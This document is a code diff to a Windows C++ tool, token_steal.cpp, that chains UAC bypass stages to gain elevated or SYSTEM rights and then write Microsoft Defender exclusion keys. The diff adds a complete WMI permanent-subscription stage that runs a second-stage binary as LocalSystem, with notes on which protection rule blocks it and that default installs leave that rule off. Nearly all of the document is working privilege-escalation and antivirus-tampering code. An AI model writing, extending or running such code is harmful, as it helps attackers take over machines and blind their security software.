@@ -5,14 +5,15 @@
     Stage order (Medium integrity):
       1. If already High: write directly
       2. SilentCleanup WINDIR hijack (HKCU writable, task is any-user-triggerable)
-      3. ICMLuaUtil COM elevation moniker (cmstp.exe host auto-elevates)
-      4. Print manual instructions
+      3. ICMLuaUtil COM elevation moniker (silent at UAC level 2, prompts at level 5)
+      4. WMI CommandLineEventConsumer -- runs as SYSTEM, bypasses UAC entirely
+         (blocked only if ASR rule "Block WMI persistence" is enabled)
 
     Phase 2 entry: token_steal.exe /elevated
       -> Writes directly to HKLM Defender exclusion registry keys
 
     Compile:
-      cl.exe token_steal.cpp /EHsc /link advapi32.lib shell32.lib ole32.lib user32.lib /out:token_steal.exe
+      cl.exe token_steal.cpp /EHsc /link advapi32.lib shell32.lib ole32.lib oleaut32.lib user32.lib wbemuuid.lib /out:token_steal.exe
 */
 
 #include <windows.h>
@@ -20,6 +21,7 @@
 #include <sddl.h>
 #include <shellapi.h>
 #include <objbase.h>
+#include <wbemcli.h>
 #include <stdio.h>
 #include <string>
 #include <ctime>
@@ -27,6 +29,8 @@
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "oleaut32.lib")
+#pragma comment(lib, "wbemuuid.lib")
 
 // ─── Logging ──────────────────────────────────────────────────────────────────
 
@@ -394,6 +398,223 @@ bool TryICMLuaUtil(const char* myExePathA) {
     return false;
 }
 
+// ─── Stage 4: WMI CommandLineEventConsumer ────────────────────────────────────
+//
+// Creates a WMI permanent subscription in ROOT\subscription.
+// CommandLineEventConsumer fires our payload as LocalSystem via the WMI service.
+// This path NEVER goes through UAC/AppInfo, so it works at ANY UAC level.
+//
+// Blocked only if ASR rule "Block persistence through WMI event subscription"
+// (GUID e6db77e5-3df2-4cf1-b95a-636979351e5b) is explicitly enabled via MDM/GPO.
+// Default Windows 11 Home/Pro installs do NOT enable this rule.
+//
+// Flow:
+//  1. Connect to ROOT\subscription
+//  2. Create __IntervalTimerInstruction (fires every 5 s)
+//  3. Create CommandLineEventConsumer -> stage2.exe
+//  4. Create __EventFilter (WQL for the timer)
+//  5. Create __FilterToConsumerBinding
+//  6. Wait 12 s for SYSTEM execution
+//  7. Check result file, clean up subscription
+
+// WMI property helpers (no printf, avoids large CRT dependency)
+static HRESULT WSet(IWbemClassObject* o, LPCWSTR n, LPCWSTR v) {
+    VARIANT var; VariantInit(&var);
+    var.vt = VT_BSTR; var.bstrVal = SysAllocString(v);
+    HRESULT hr = o->Put(n, 0, &var, 0);
+    VariantClear(&var); return hr;
+}
+static HRESULT WSetI(IWbemClassObject* o, LPCWSTR n, long v) {
+    VARIANT var; VariantInit(&var);
+    var.vt = VT_I4; var.lVal = v;
+    HRESULT hr = o->Put(n, 0, &var, 0);
+    VariantClear(&var); return hr;
+}
+
+// Delete a WMI instance by its __RELPATH (obtained from a query result).
+// We query-then-delete to avoid building the escaped-key path string by hand.
+static void WDelByQuery(IWbemServices* pSvc, LPCWSTR wql) {
+    BSTR lang = SysAllocString(L"WQL");
+    BSTR q    = SysAllocString(wql);
+    IEnumWbemClassObject* pEnum = nullptr;
+    if (SUCCEEDED(pSvc->ExecQuery(lang, q,
+            WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
+            nullptr, &pEnum))) {
+        IWbemClassObject* pObj = nullptr; ULONG ret = 0;
+        while (pEnum->Next(WBEM_INFINITE, 1, &pObj, &ret) == S_OK) {
+            VARIANT vp; VariantInit(&vp);
+            if (SUCCEEDED(pObj->Get(L"__RELPATH", 0, &vp, nullptr, nullptr))
+                && vp.vt == VT_BSTR)
+                pSvc->DeleteInstance(vp.bstrVal, 0, nullptr, nullptr);
+            VariantClear(&vp); pObj->Release();
+        }
+        pEnum->Release();
+    }
+    SysFreeString(q); SysFreeString(lang);
+}
+
+bool TryWMISubscription(const char* myExePathA) {
+    INFO("=== Stage 4: WMI CommandLineEventConsumer (SYSTEM) ===");
+    INFO("Runs as LocalSystem via WMI service -- UAC level irrelevant");
+
+    // Derive stage2.exe path from our own path
+    char s2pathA[MAX_PATH] = {};
+    strncpy(s2pathA, myExePathA, MAX_PATH - 1);
+    char* sl = strrchr(s2pathA, '\\');
+    if (sl) strcpy(sl + 1, "stage2.exe");
+    else    strcpy(s2pathA, "stage2.exe");
+    INFO("WMI will execute: %s", s2pathA);
+
+    if (GetFileAttributesA(s2pathA) == INVALID_FILE_ATTRIBUTES) {
+        ERR("stage2.exe not found at %s -- compile it first", s2pathA);
+        return false;
+    }
+
+    // Wipe any stale result file
+    DeleteFileA("C:\\exclusiontest\\exclusion_result.txt");
+
+    wchar_t s2w[MAX_PATH] = {};
+    MultiByteToWideChar(CP_ACP, 0, s2pathA, -1, s2w, MAX_PATH);
+
+    // Initialise COM (MULTITHREADED required for WMI)
+    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
+    bool needUninit = (hr == S_OK || hr == S_FALSE);
+
+    // Set security blanket -- ignore RPC_E_TOO_LATE (already set by Stage 3)
+    CoInitializeSecurity(nullptr, -1, nullptr, nullptr,
+        RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE,
+        nullptr, EOAC_NONE, nullptr);
+
+    IWbemLocator* pLoc = nullptr;
+    hr = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
+                          IID_IWbemLocator, (void**)&pLoc);
+    if (FAILED(hr)) {
+        ERR("CoCreateInstance WbemLocator: 0x%08lX", hr);
+        if (needUninit) CoUninitialize(); return false;
+    }
+
+    IWbemServices* pSvc = nullptr;
+    {
+        BSTR bns = SysAllocString(L"ROOT\\subscription");
+        hr = pLoc->ConnectServer(bns, nullptr, nullptr, nullptr,
+                                 0, nullptr, nullptr, &pSvc);
+        SysFreeString(bns);
+    }
+    pLoc->Release();
+    if (FAILED(hr)) {
+        ERR("ConnectServer ROOT\\subscription: 0x%08lX", hr);
+        if (needUninit) CoUninitialize(); return false;
+    }
+    CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
+                      RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
+                      nullptr, EOAC_NONE);
+    OK("Connected to ROOT\\subscription");
+
+    bool ok = false;
+
+    // 1. __IntervalTimerInstruction -- fires every 5 000 ms
+    {
+        IWbemClassObject *cls = nullptr, *inst = nullptr;
+        BSTR bn = SysAllocString(L"__IntervalTimerInstruction");
+        pSvc->GetObject(bn, 0, nullptr, &cls, nullptr); SysFreeString(bn);
+        if (!cls) { ERR("GetObject __IntervalTimerInstruction failed"); goto cleanup; }
+        cls->SpawnInstance(0, &inst);
+        WSet (inst, L"TimerID",               L"EscTimer1");
+        WSetI(inst, L"IntervalBetweenEvents",  5000);
+        hr = pSvc->PutInstance(inst, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
+        cls->Release(); inst->Release();
+        if (FAILED(hr)) { ERR("PutInstance timer: 0x%08lX", hr); goto cleanup; }
+        OK("Created __IntervalTimerInstruction (5 s)");
+    }
+
+    // 2. CommandLineEventConsumer -- runs s2path as SYSTEM
+    {
+        IWbemClassObject *cls = nullptr, *inst = nullptr;
+        BSTR bn = SysAllocString(L"CommandLineEventConsumer");
+        pSvc->GetObject(bn, 0, nullptr, &cls, nullptr); SysFreeString(bn);
+        if (!cls) { ERR("GetObject CommandLineEventConsumer failed"); goto cleanup; }
+        cls->SpawnInstance(0, &inst);
+        WSet(inst, L"Name",                L"EscConsumer1");
+        WSet(inst, L"CommandLineTemplate", s2w);
+        hr = pSvc->PutInstance(inst, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
+        cls->Release(); inst->Release();
+        if (FAILED(hr)) { ERR("PutInstance consumer: 0x%08lX", hr); goto cleanup; }
+        OK("Created CommandLineEventConsumer -> %s", s2pathA);
+    }
+
+    // 3. __EventFilter -- watches for our timer
+    {
+        IWbemClassObject *cls = nullptr, *inst = nullptr;
+        BSTR bn = SysAllocString(L"__EventFilter");
+        pSvc->GetObject(bn, 0, nullptr, &cls, nullptr); SysFreeString(bn);
+        if (!cls) { ERR("GetObject __EventFilter failed"); goto cleanup; }
+        cls->SpawnInstance(0, &inst);
+        WSet(inst, L"Name",           L"EscFilter1");
+        WSet(inst, L"EventNameSpace", L"root\\cimv2");
+        WSet(inst, L"QueryLanguage",  L"WQL");
+        WSet(inst, L"Query",
+             L"SELECT * FROM __TimerEvent WHERE TimerID='EscTimer1'");
+        hr = pSvc->PutInstance(inst, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
+        cls->Release(); inst->Release();
+        if (FAILED(hr)) { ERR("PutInstance filter: 0x%08lX", hr); goto cleanup; }
+        OK("Created __EventFilter");
+    }
+
+    // 4. __FilterToConsumerBinding -- links filter to consumer
+    {
+        IWbemClassObject *cls = nullptr, *inst = nullptr;
+        BSTR bn = SysAllocString(L"__FilterToConsumerBinding");
+        pSvc->GetObject(bn, 0, nullptr, &cls, nullptr); SysFreeString(bn);
+        if (!cls) { ERR("GetObject __FilterToConsumerBinding failed"); goto cleanup; }
+        cls->SpawnInstance(0, &inst);
+        WSet(inst, L"Filter",
+             L"__EventFilter.Name=\"EscFilter1\"");
+        WSet(inst, L"Consumer",
+             L"CommandLineEventConsumer.Name=\"EscConsumer1\"");
+        hr = pSvc->PutInstance(inst, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
+        cls->Release(); inst->Release();
+        if (FAILED(hr)) { ERR("PutInstance binding: 0x%08lX", hr); goto cleanup; }
+        OK("Binding created -- WMI event active, SYSTEM process imminent");
+    }
+
+    INFO("Waiting 12s for WMI event to fire...");
+    Sleep(12000);
+
+    {
+        FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "r");
+        if (f) {
+            char buf[256] = {}; fgets(buf, sizeof(buf), f); fclose(f);
+            buf[strcspn(buf, "\r\n")] = 0;
+            OK("Stage 4 result: %s", buf);
+            ok = (strncmp(buf, "ok", 2) == 0);
+            if (ok)   OK("SUCCESS via WMI SYSTEM execution!");
+            else WARN("stage2 ran but reported: %s", buf);
+        } else {
+            WARN("No result file after 12s");
+            WARN("Possible causes:");
+            WARN("  (a) ASR rule 'Block WMI persistence' is ON -- check Windows Security > App & browser control > Exploit protection settings");
+            WARN("  (b) WMI event host (scrcons.exe) blocked by Defender");
+            WARN("  (c) ROOT\\subscription write was denied (try from admin CMD to confirm)");
+        }
+    }
+
+cleanup:
+    INFO("Cleaning up WMI subscription...");
+    WDelByQuery(pSvc,
+        L"SELECT * FROM __FilterToConsumerBinding WHERE Consumer LIKE '%EscConsumer1%'");
+    WDelByQuery(pSvc,
+        L"SELECT * FROM CommandLineEventConsumer WHERE Name='EscConsumer1'");
+    WDelByQuery(pSvc,
+        L"SELECT * FROM __EventFilter WHERE Name='EscFilter1'");
+    WDelByQuery(pSvc,
+        L"SELECT * FROM __IntervalTimerInstruction WHERE TimerID='EscTimer1'");
+    DBG("WMI cleanup done");
+
+    pSvc->Release();
+    if (needUninit) CoUninitialize();
+    return ok;
+}
+
 // ─── Main ──────────────────────────────────────────────────────────────────────
 
 int main(int argc, char* argv[]) {
@@ -454,7 +675,12 @@ int main(int argc, char* argv[]) {
         // Stage 3: ICMLuaUtil COM moniker
         INFO("--- Trying Stage 3: ICMLuaUtil COM ---");
         if (TryICMLuaUtil(myPath)) goto done;
-        WARN("Stage 3 failed -- all automated stages exhausted");
+        WARN("Stage 3 failed -- trying Stage 4");
+
+        // Stage 4: WMI CommandLineEventConsumer (runs as SYSTEM via WMI service)
+        INFO("--- Trying Stage 4: WMI CommandLineEventConsumer ---");
+        if (TryWMISubscription(myPath)) goto done;
+        WARN("Stage 4 failed -- all automated stages exhausted");
     }
 
     // All stages failed
